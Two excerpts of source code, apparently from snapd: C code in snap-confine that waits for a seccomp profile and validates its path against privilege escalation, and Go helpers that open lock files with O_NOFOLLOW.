   207	    // the system boots snapd will created security profiles, but
   208	    // a service snap (e.g. network-manager) starts in parallel with
   209	    // snapd so for such snaps, the profiles may not be generated
   210	    // yet
   211	    long max_wait = 120;
   212	    const char *MAX_PROFILE_WAIT = getenv("SNAP_CONFINE_MAX_PROFILE_WAIT");
   213	    if (MAX_PROFILE_WAIT != NULL) {
   214	        char *endptr = NULL;
   215	        errno = 0;
   216	        long env_max_wait = strtol(MAX_PROFILE_WAIT, &endptr, 10);
   217	        if (errno != 0 || MAX_PROFILE_WAIT == endptr || *endptr != '\0' || env_max_wait <= 0) {
   218	            die("SNAP_CONFINE_MAX_PROFILE_WAIT invalid");
   219	        }
   220	        max_wait = env_max_wait > 0 ? env_max_wait : max_wait;
   221	    }
   222	    if (max_wait > 3600) {
   223	        max_wait = 3600;
   224	    }
   225	
   226	    if (!sc_wait_for_file(profile_path, max_wait)) {
   227	        /* log but proceed, we'll die a bit later */
   228	        debug("timeout waiting for seccomp binary profile file at %s", profile_path);
   229	    }
   230	    // TODO: move over to open/openat as an additional hardening measure.
   231	
   232	    // validate '/' down to profile_path are root-owned and not
   233	    // 'other' writable to avoid possibility of privilege
   234	    // escalation via bpf program load when paths are incorrectly
   235	    // set on the system.
   236	    validate_bpfpath_is_safe(profile_path);

[atomic and lock helpers]
    35	// OpenExistingLockForReading opens an existing lock file given by "path".
    36	// The lock is opened in read-only mode.
    37	func OpenExistingLockForReading(path string) (*FileLock, error) {
    38		flag := syscall.O_RDONLY | syscall.O_NOFOLLOW | syscall.O_CLOEXEC
    39		file, err := os.OpenFile(path, flag, 0)
    40		if err != nil {
    41			return nil, err
    42		}
    43		l := &FileLock{file: file}
    44		return l, nil
    45	}
    46	
    47	// NewFileLockWithMode creates and opens the lock file given by "path" with the given mode.
    48	func NewFileLockWithMode(path string, mode os.FileMode) (*FileLock, error) {
    49		flag := syscall.O_RDWR | syscall.O_CREAT | syscall.O_NOFOLLOW | syscall.O_CLOEXEC
    50		file, err := os.OpenFile(path, flag, mode)
    51		if err != nil {
    52			return nil, err
    53		}
    54		l := &FileLock{file: file}
    55		return l, nil
    56	}
    57	
    58	// NewFileLockWithFile wraps an open file with a file lock which can be used for
    59	// locking.
    60	func NewFileLockWithFile(f *os.File) *FileLock {
    61		return &FileLock{file: f}
    62	}
    63	
    64	// NewFileLock creates and opens the lock file given by "path" with mode 0600.
    65	func NewFileLock(path string) (*FileLock, error) {
    66		return NewFileLockWithMode(path, 0600)
    67	}
